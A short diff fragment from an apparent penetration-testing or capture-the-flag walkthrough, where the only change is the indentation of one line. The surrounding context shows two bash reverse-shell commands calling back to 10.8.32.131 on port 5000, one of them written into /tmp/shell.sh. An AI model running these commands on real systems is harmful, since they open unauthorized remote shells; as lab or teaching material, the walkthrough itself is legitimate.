@@ -188,7 +188,7 @@ You can use hydra to bruteforce FTP access. You should check for executables fil
       #!/bin/bash
       bash -i >& /dev/tcp/10.8.32.131/5000 0>&1
 
-Or you can directly craft a bash script and execute it:
+      Or you can directly craft a bash script and execute it:
 
       echo "bash -c 'bash -i >& /dev/tcp/10.8.32.131/5000 0>&1'" > /tmp/shell.sh
       
